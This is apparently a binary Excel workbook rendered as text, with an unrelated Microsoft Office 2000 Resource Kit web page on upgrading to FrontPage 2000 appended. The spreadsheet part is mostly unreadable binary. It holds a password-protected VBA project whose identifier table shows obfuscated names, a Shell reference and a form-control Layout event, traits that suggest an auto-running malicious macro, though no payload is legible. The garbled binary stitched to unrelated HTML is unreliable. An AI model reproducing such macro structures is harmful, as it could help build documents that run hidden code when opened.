šÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            ÿÿÿÿ   ÿÿÿÿ          œ       iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    p      ƒþÿÿÿÿÿ    ÿÿÿÿ     ÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ         ( %   ‚ *ÿÿÿÿþÿÿÿÿÿÿÿX   ÿÿþÿÿÿ    ÿÿÿÿÿÿÿÿ         ( %   ÿÿÿÿp   @   ÿÿÿÿÿÿÿÿ                   ÿÿÿÿ            ¸     Øÿÿ          Œ     H  H   ÿÿÿÿÿÿÿÿè       è  „   H     ÿÿÿÿ`  aƒ–   ÿÿÿÿÿÿÿÿ       ÿÿÿÿ„   iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ°              p   ÿÿÿÿÿÿÿÿ    @   ÿÿÿÿp   ÿÿÿÿÿÿÿÿ    @   ÿÿÿÿÿÿÿÿ(  ð           ˆ        àÀÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    `  Q’`^  * \ R 8 0 0 4 * # 2 f ßK                                                           þÊ N  €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ €	     ÿÿÿÿ"          
             ÿÿÿÿ(   –p     o         &B@n  ÿÿ    ÿÿÿÿX   ÿÿÿÿ  ± Attribut e VB_Nam e = "She@et1"

èBast0{000À20820-  C $0046}
|Global!ÄSpac’FalsedCreatablPre decla Id «Tru
BExposeTemp lateDeriv$’BustomizD2Control–cpp,  1, 0, M SForms, ÌFr ¥€€
ÿ @P€}€ Sub @/_Layout ()
This Workbook .List10

End

                                                     Ìa²   ÿ  	  ¤            þ * \ G { 0 0 0 2 0 4 E F - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 4 . 2 # 9 # C : \ P R O G R A ~ 1 \ C O M M O N ~ 1 \ M I C R O S ~ 1 \ V B A \ V B A 7 . 1 \ V B E 7 . D L L # V i s u a l   B a s i c   F o r   A p p l i c a t i o n s             * \ G { 0 0 0 2 0 8 1 3 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 _ V B A _ P R O J E C T                                           ÿÿÿÿÿÿÿÿÿÿÿÿ                                    Z   Ã      d i r                                                            ÿÿÿÿÿÿÿÿÿÿÿÿ                                    –   	      _ _ S R P _ 0                                                     ÿÿÿÿÿÿÿÿÿÿÿÿ                                    £   ½	      _ _ S R P _ 1                                                       	   ÿÿÿÿ                                    Ê   è       } # 1 . 9 # 0 # C : \ P r o g r a m   F i l e s \ M i c r o s o f t   O f f i c e \ O f f i c e 1 6 \ E X C E L . E X E # M i c r o s o f t   E x c e l   1 6 . 0   O b j e c t   L i b r a r y             ¼ * \ G { 0 0 0 2 0 4 3 0 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 2 . 0 # 0 # C : \ W i n d o w s \ S y s t e m 3 2 \ s t d o l e 2 . t l b # O L E   A u t o m a t i o n             (* \ G { 2 D F 8 D 0 4 C - 5 B F A - 1 0 1 B - B D E 5 - 0 0 A A 0 0 4 4 D E 5 2 } # 2 . 8 # 0 # C : \ P r o g r a m   F i l e s \ C o m m o n   F i l e s \ M i c r o s o f t   S h a r e d \ O F F I C E 1 6 \ M S O . D L L # M i c r o s o f t   O f f i c e   1 6 . 0   O b j e c t   L i b r a r y             Þ * \ G { 0 D 4 5 2 E E 1 - E 0 8 F - 1 0 1 A - 8 5 2 E - 0 2 6 0 8 C 4 D 0 B B 4 } # 2 . 0 # 0 # C : \ W i n d o w s \ s y s t e m 3 2 \ F M 2 0 . D L L # M i c r o s o f t   F o r m s   2 . 0   O b j e c t   L i b r a r y            * \ G { 5 8 A F D 9 4 5 - E C E B - 4 B 8 1 - 9 F 4 0 - 5 1 A A 1 E F 2 D B 0 2 } # 2 . 0 # 0 # C : \ U s e r s \ I E U s e r \ A p p D a t a \ L o c a l \ T e m p \ E x c e l 8 . 0 \ M S F o r m s . e x d # M i c r o s o f t   F o r m s   2 . 0   O b j e c t   L i b r a r y              á.E
à….`ŒM
´              "ÿÿÿÿÿÿ    ÿÿ  Q’`^ ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿÿÿ  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ                   ½½  T h i s W o r k b o o k  0 A 5 e 6 0 9 2 e c ÿÿ' T h i s W o r k b o o k ÿÿð          ì%  ÿÿ S h e e t 1  0 @ 5 e 6 0 9 2 8 6 ÿÿ+ S h e e t 1 ÿÿHà         y	  ÿÿÿÿÿÿ8  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ   ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ  ÿÿÿÿÿÿÿÿ   ‚   ƒ   „   …   †   ‡   ˆ   ‰   Š   ‹   Œ      Ž         ‘   ’   “   ”   •   þÿÿÿ—   ˜   ™   š   ›   œ      ž   Ÿ       ¡   ¢   þÿÿÿ¤   ¥   ¦   §   ¨   ©   ª   «   ¬   ­   ®   ¯   °   ±   ²   ³   ´   µ   ¶   ·   ¸   ¹   º   »   ¼   ½   ¾   ¿   À   Á   Â   Ã   Ä   Å   Æ   Ç   È   É   þÿÿÿË   Ì   Í   þÿÿÿþÿÿÿÐ   Ñ   Ò   Ó   Ô   Õ   Ö   þÿÿÿØ   Ù   þÿÿÿÿÿÿÿÜ   Ý   Þ   þÿÿÿà   þÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿsù®à„uÑG´o=VòáÝŒÿÿÿÿ   œXO7ŒxIºj‰$ÇLßÀÿÿÿÿ   ÿÿÿÿH   €     NI Ð4    
 „ ÿ  bExcel€+@ VBA÷â@ Win16Á~@ Win32 @ Win64x@ Mac³²@ VBA6­#@ VBA7®#@ Project1
@ stdole“`@ 
VBAProject¾¿@ Officeu@ ThisWorkbook|ã@ 	€  ÿ _EvaluateÙ@ Sheet1è@ UpdayeLinkssÝR@ Workbookk@ 
AddinContns õ@  ComactD?%@ 	TestCellsá
@ 
HistoryLoge3@ FalseValue12t@ 
OnResolutionVú@ ggF~“@ 
DateAndTime·‹@ 
€  ÿ Application¥*@ 
€  ÿ International½¤@ €  ÿ xlCountrySettingo5@ 
VersionAccuÀà@ SaveLinkÀ@@ 
LineToLineã)@ aX@ cZ@ d[@ SubLin´V@ SubComp'@ bb¡\@  ChrK~@  ValÝâ@  Asc!u@ ConflictResolutions1h@  JoidC&@  ShellV×@ AccS{ò@ AccuuuracyChevcú@  xlRegionLabelOptionsNoneŽ@ ZeRoýL@ €  ÿ msoSyncCompareAndMergeß¼@ List10ƒ(@ tk@ yl@ ul@ rr_@ grj]@  LTrimôb@  Str—Õ@ 
€  ÿ xlCenterPoint%2@  €  ÿ xlUnderlineStyleSingleAccounting|h@ €  ÿ xlTickMarkOutside#@ €  ÿ xlMonthsX–@ 	WorksheetÁþ@  MSFormsC@ Frame1¹@ cppq@ 	cpp_Click#á@ 
ReturnIntegerå‚@ 	cpp_KeyUpKK@  KeyCodeí˜@ Shiftäë@ €  ÿ ClickŠã@ 
cpp_Layout:@ €  ÿ KeyUp²M@ ÿÿ`     ÿÿ"ÿÿÿÿ$ ÿÿ'   ˆ ÿÿ+  ÿÿÿÿÿÿ ÿÿ  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ     $                                                                                                   ³€     0*	 pH ‚ d¤ 
  VBAProjeˆct 4  @j
=
 r	Q’`^” J<
 r€stdole> s t d o €l e 
 h %^ *\G{00€020430- C 
004 6}#2.0#0 #C:\Wind ows\Syst em32\e2. tlb#OLE  Automation ` ƒEOffDic„EO f€ iÔ c‚Ež€”€E 2DF8D04C -5BFA-10€1B-BDE5€EÔAA€C4€2ˆE€˜ gram Fil es\CommonMicros oft Shar ed\OFFIC E16\MSO.0DLL#‡ƒM 1@6.0 ObÁ €Library K   €MSF€orms>  S F §r m s 3€  ¦ D452EE1-E08F`A-8 -02608C@4D0BB4SsaSFM20L'B £À_Ì&/ ; "1À ƒjIqAHq00}t#0Bq#À€ ž504 ¨€	ŠÀ A58 AFD945-E CEB-4B81 -9F40-51 AA1EF2DB0ÉfUsers\IEÁ\AppD ata\Loca l\Temp\E€xcel8.0ÀcáB8.exdÈdU= #€ á.E
à ….`ŒM
Š´AÒÂÓ Â½½Â½This Workbook¨G ÀT@¿i m"W‚ok bÀo ¨k Î
2Ú
À(  HB1Âáì%X  B,Â!ðT""+¢ ârS@heet1Gâ
SÅ eà`t 1 ¡vM£2®ï
y	ï
H
àé
¢                                                       “K*²    ÿÿ      ÿÿ                                    rU       @       @       @             ~
      ~      ~      ~      ~      ~      ~      ~R              "                                      ‚‘’ß®wI®Ÿ¦s1þÍ 	    ¤       ÿÿÿÿÿÿÿÿ ƒŠ$           ‘
          ÿÿÿÿÿÿÿÿ 
          1
          a
          
          ±
          á
                    A                    ±          Ñ          
          1
          Q
          q
          ÿÿ  ±          
 ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    á           Ñ                          1                          a                          Ñ                                                                               Project1      
       VBAProject             ThisWorkbook             Sheet1      ï     À      F      1       C:\PROGRA~1\COMMON~1\MICROS~1\VBA\VBA7.1\VBE7.DLL             VBA      
          ÿÿÿÿÿÿÿÿ  	   1          ±          °                            À      F      4       C:\Program Files\Microsoft Office\Office16\EXCEL.EXE             Excel      
a          ÿÿÿÿÿÿÿÿ 	     ‘                    Ð                       0     À      F             C:\Windows\System32\stdole2.tlb             stdole      
Á          ÿÿÿÿÿÿÿÿ       ñ          A          ð                       LÐø-ú[½å ª DÞR      ?       C:\Program Files\Common Files\Microsoft Shared\OFFICE16\MSO.DLL             Office      
ñ          ÿÿÿÿÿÿÿÿ      !          ±                                á.E
à….`ŒM
´             C:\Windows\system32\FM20.DLL              MSForms      
a           a                  ‘           á           0                    EÙ¯XëìKŸ@QªòÛ      7       C:\Users\IEUser\AppData\Local\Temp\Excel8.0\MSForms.exd      
¡          a                  Ñ          á           P                    Ú     À      F      1*¼4ôH—öE«nWÁÄ           À      F      y3¶gÁ¯M¶råE}      D     À      F             Workbook             UpdayeLinkss      
       AddinContns              ComactD      
       DateAndTime      	       TestCells      
       VersionAccu      
       HistoryLog             ConflictResolutions1             FalseValue12             ZeRo             AccuuuracyChevc      
       OnResolutionV             List10             ggF             AccS      
    x               F                 rU@       @       @       @             ~z                                ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ              ÿÿÿÿÿÿÿÿ      	1          ¡
                                 SaveLink      
       LineToLineV                                      ThisWorkbook T h i s W o r k b o o k   Sheet1 S h e e t 1       ID="{DA4FADAB-A681-410A-9F97-6FEA1A927470}"
Document=ThisWorkboP R O J E C T w m                                                 ÿÿÿÿÿÿÿÿÿÿÿÿ                                    Î   >       P R O J E C T                                                           ÿÿÿÿ                                    Ï   ú       S u m m a r y I n f o r m a t i o n                           (       ÿÿÿÿ                                    ×   ˆ        D o c u m e n t S u m m a r y I n f o r m a t i o n           8  ÿÿÿÿÿÿÿÿÿÿÿÿ                                    Û   ð       ok/&H00000000
Document=Sheet1/&H00000000
Name="VBAProject"
HelpContextID="0"
VersionCompatible32="393222000"
CMG="2A2C3F13436F7573757375747573"
DPB="5A5E4A41556E566E566E"
GC="8A889BB7C8B8C8B837"

[Host Extender Info]
&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
&H00000002={00020818-0000-0000-C000-000000000046};Excel8.0;&H00000000

[Workspace]
ThisWorkbook=26, 26, 1662, 450, Z
Sheet1=52, 52, 1688, 476, 
      þÿ  
                     à…ŸòùOh«‘ +'³Ù0   X         0      8   
   D      P              ¤  @   €ÅaaWÓÔ@    þ°BZÓÔ       WÓÔ@    þ°BZÓÔ       @   €ÅaaWÓÔ@    þ°BZÓÔ        þ°BZÓÔ                                                       þÿ  
                     ÕÍÕœ.“— +,ù®0   À         P      X   
   `      h      p      x   
   €      œ              ¤        
       
       
       
               3.2019ƒV[ƒg               Worksheets        ksheets        þÿ
  ÿÿÿÿ      À      F   Microsoft Excel 2003 Worksheet  C o m p O b j                                                   ÿÿÿÿÿÿÿÿÿÿÿÿ                                    ß   k                                                                           ÿÿÿÿÿÿÿÿÿÿÿÿ                                                                                                                    ÿÿÿÿÿÿÿÿÿÿÿÿ                                                                                                                    ÿÿÿÿÿÿÿÿÿÿÿÿ                                                   Biff8    Excel.Sheet.8 ô9²q                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<TITLE>Microsoft Office 2000 Resource Kit</TITLE>
<SCRIPT LANGUAGE="JavaScript">
<!--
	if (navigator.userAgent.indexOf("MSIE 4") != -1)
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../ork.css\" TYPE=\"text/css\">");
		document.write("<STYLE>");
		document.write("<<!-->");
		document.write("<A:hover	{color: 003399}>");
		document.write("<//-->>");
		document.write("</STYLE>");
			}
	else
			{
	if (navigator.appName == "Netscape")
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../orkns.css\" TYPE=\"text/css\">");
			}
	else
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../ork.css\" TYPE=\"text/css\">");
	}
			}
//-->
</SCRIPT></HEAD>

<BODY BGCOLOR="#FFFFFF" TEXT="#000000">


<!-- Start: ToolBar for down-level browsers-->

<TABLE WIDTH='100%' CELLPADDING=0 CELLSPACING=0 BORDER=0 BGCOLOR='#FFFFFF'>
<TR>
	<TD VALIGN='middle' HEIGHT=60 ROWSPAN=2><IMG SRC="../images/offlogo.GIF" ALIGN=left border=0></TD>
	<TD VALIGN='middle' HEIGHT=20 ALIGN='RIGHT'><IMG SRC='../images/curve.gif' WIDTH=18 HEIGHT=20 ALT='' BORDER=0></TD>
	<TD BGCOLOR='#000000' HEIGHT=20 VALIGN='middle' ALIGN='RIGHT' NOWRAP COLSPAN=2>
		<FONT COLOR='#FFFFFF' FACE='Verdana, Arial' SIZE=1>
		<B>
			<IMG SRC='../images/1ptrans.gif' WIDTH=220 HEIGHT=15 ALT='' BORDER=0><A STYLE='color:#FFFFFF;text-decoration:none;' HREF="http://www.microsoft.com" TARGET='_top'><FONT COLOR='#FFFFFF'>microsoft.com Home</FONT></A>&nbsp;&nbsp;
		</B>
		</FONT></TD>
</TR>
<TR>
	<TD VALIGN='TOP' HEIGHT=40 WIDTH=19><IMG SRC='../images/1ptrans.gif' WIDTH=19 HEIGHT=40 ALT='' BORDER=0></TD>
	<TD VALIGN='TOP' HEIGHT=40 ALIGN='RIGHT' NOWRAP COLSPAN=2><A HREF="http://www.microsoft.com" TARGET='_top'><IMG SRC='../images/mslogo.gif' WIDTH=112 HEIGHT=40 ALT='Microsoft' BORDER=0></A></TD>
</TR>
<TR>
	<!-- Start: Local menus -->
	<TD BGCOLOR='#000000' HEIGHT=20 NOWRAP VALIGN='MIDDLE' COLSPAN=4 align=right>
		<IMG SRC='../images/1ptrans.gif' WIDTH=19 HEIGHT=7 ALT='' BORDER=0>
		<A HREF="http://www.microsoft.com/office/ork" style="text-decoration: none;"><FONT COLOR='#FFFFFF' FACE='Verdana, Arial' SIZE=1><B>
http://www.microsoft.com/office/ork</FONT></B></A>&nbsp;&nbsp;</TD>
	<!-- End: Local menus -->
</TR>
</TABLE>



<!-- End: ToolBar V2.0-->


<!-------------------------------- BEGIN ORK NAVIGATION BAR -------------------------------->

<TABLE WIDTH=100% CELLPADDING=0 CELLSPACING=0 BORDER=0>
	<TR>
	<TD VALIGN=TOP WIDTH=2%>

	<TABLE width=165 CELLPADDING=0 CELLSPACING=0 BORDER=0 height="100%">
		<TR>
		<TD VALIGN=TOP bgcolor="#666699" align=right>

	<TABLE CELLPADDING=0 CELLSPACING=0 BORDER=0>
		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=1 BORDER="0"><FONT FACE="verdana, helvetica, arial" SIZE="2"><A Href="../default.htm"><DIV CLASS=tier1white ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><IMG SRC="../images/spacer.gif" WIDTH=9 HEIGHT=35 BORDER="0" align="left">Microsoft Office 2000 Resource Kit Home</DIV></a></FONT></TD>
		</TR>
		
		<TR>
		<TD bgcolor="#666699"><div class=tier1><img src="../images/stripe.jpg" width=155 height=1 align=center></div></TD>
		</TR>
		
		
		
		<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><A Href="../default.htm"><DIV CLASS=tier1yellow ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1yellow'"><img src="../images/minus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left"><b>&nbsp;Upgrading to Office 2000</b></DIV></a></FONT>
</TD></TR>

		<TR>
		<TD bgcolor="#CCCCCC"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><a href="../four/67ct.htm"><DIV CLASS=tier1 ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1'"><img src="../images/blkplus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=15 BORDER="0" align="left">&nbsp;Planning Your Move to Office 2000</DIV></a></FONT></TD>
		</TR>
		

		<TR>
		<TD bgcolor="#CCCCCC"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><a href="../four/68ct.htm"><DIV CLASS=tier1 ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1'"><img src="../images/blkminus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=10 BORDER="0" align="left"><b>&nbsp;Office 2000 Upgrading Reference</b></DIV></a></FONT>
	


			<TABLE WIDTH=155 CELLPADDING=0 CELLSPACING=0 BORDER=0 bgcolor="#CCCCCC" style="margin-left: 1em;">
			
			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>

				<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68ct_1.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to Access 2000</DIV></A></FONT></TD>
				</TR>
				
			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>

				<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t2.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to Excel 2000</DIV></B></FONT></TD>
				</TR>
				
							<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
							<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t3.htm"><DIV class=tier2hot>Upgrading to FrontPage 2000</DIV></B></FONT></TD>
				</TR>
				
											<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
							<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t4.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to Outlook 2000</DIV></B></FONT></TD>
				</TR>
				
															<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
										<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t5.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to PowerPoint 2000</DIV></B></FONT></TD>
				</TR>
				
																			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
										<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t6.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to Word 2000</DIV></B></FONT></TD>
				</TR>
				
				<tr>
							<TD bgcolor="#CCCCCC"><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
				


			</TABLE>

		</TD></TR>
		

		

		


		<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE=2><a href="../appndx/95ct.htm"><DIV CLASS=tier1white ID="img6" onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><img src="../images/plus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left">&nbsp;Overview of Tools and Utilities</DIV></a></FONT>
</TD></TR>

	
		
		
		

		
	<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE="2" COLOR="#000000"><A HREF="../appndx/glossary.htm"><DIV CLASS=tier1white onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"> <IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=10 BORDER="0">Glossary</DIV></A></FONT></TD>
		</TR>
		
		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=1 HEIGHT=5 BORDER="0"><FONT FACE="verdana, helvetica, arial" SIZE="2" COLOR="#000000"><A HREF="../appndx/index.htm"><DIV CLASS=tier1white onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=10 BORDER="0">Index</DIV></A></FONT></TD>
		</TR>

		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=147 HEIGHT=200></TD>
		</TR>

		</TABLE>

	</TD>
	</TR>
	</TABLE>
	</TD>

<!-------------------------------- END NAVIGATION BAR -------------------------------->


	<TD><IMG SRC="../images/spacer.gif" WIDTH=1 HEIGHT=10 BORDER="0"></TD>
	<TD VALIGN=TOP WIDTH=99%>
    







<!-------------------------------- BEGIN PAGE CONTENT -------------------------------->

<a name="top"></a>
<H5 class=topic>Upgrading to FrontPage&nbsp;2000</H5>
<H1 class=page>
<SUP><A NAME="68t3pt2"></A></SUP>Upgrading from Previous Versions of the FrontPage Client</H1>
<a name="dex2"></a>





<P class=T>Microsoft FrontPage&nbsp;2000 saves files in the same file format as every previous version of FrontPage&nbsp;� namely, HTML. You can open your existing FrontPage files in FrontPage&nbsp;2000 without having to convert them. The key difference between versions is the different feature sets. Features added to a Web page in FrontPage&nbsp;2000 do not work in previous versions that do not include that feature.</P>
<a name="dex3"></a>

<P class=T>You can use FrontPage&nbsp;2000 to open a web created with FrontPage 98 or FrontPage 97 and edit any of its features. Each version of FrontPage includes and supports nearly all of the features that are in previous versions.</P>
<a name="dex4"></a>

<P class=T>The features in previous versions that FrontPage&nbsp;2000 does not support are:</P>
<a name="dex5"></a>

<UL>
	<LI class=LB1>Internet Database Connectivity (FrontPage 97 and FrontPage 98)</li>

<a name="dex6"></a>


	<LI class=LB1>Channel Definition File (FrontPage 98 only)</li>

<a name="dex7"></a>






	<LI class=LB1>Microsoft Personal Web Server
<P class=LT1>FrontPage&nbsp;2000 does not include Personal Web Server; however, if Personal Web Server is installed on your computer, it is updated to the latest version of Personal Web Server when you install FrontPage&nbsp;2000.
</li>
</UL>

<p class=t align=right><b><a href="#top">Top</a></b></p>

<H4>Settings that migrate to FrontPage&nbsp;2000</H4>
<a name="dex8"></a>

<P class=T>When FrontPage&nbsp;2000 opens a file created in FrontPage 97 or FrontPage 98, it preserves any special settings or customized components that were saved with that file in its original version. The following components from FrontPage 97 and FrontPage 98 files migrate to FrontPage&nbsp;2000:</P>
<a name="dex9"></a>

<UL>
	<LI class=LB1>Customized themes (FrontPage 98 only)</li>

<a name="dex10"></a>


	<LI class=LB1>Customized templates</li>

<a name="dex11"></a>


	<LI class=LB1>Customized menus</li>

<a name="dex12"></a>


	<LI class=LB1>List of the most recently used Web sites (added to Web folders)
</li>
</UL>
<a name="dex13"></a>

<P class=T>In addition, any program that uses FrontPage 97 or FrontPage 98 Automation interfaces works with FrontPage&nbsp;2000.</P>

<p class=t align=right><b><a href="#top">Top</a></b></p>

<H4>Working with webs created in previous versions</H4>
<a name="dex14"></a>



<P class=T>You can use FrontPage&nbsp;2000 to edit and publish to webs created with FrontPage 97 or FrontPage 98. For example, if you create a Web page in FrontPage&nbsp;2000, you can publish it to a FrontPage 98&nbsp;�&nbsp;based web. However, new FrontPage&nbsp;2000 features do not work on FrontPage 98&nbsp;�&nbsp;based or FrontPage 97&nbsp;�&nbsp;based webs. You can also update a web created in a previous version by opening, editing, and then saving it in FrontPage&nbsp;2000.</P>

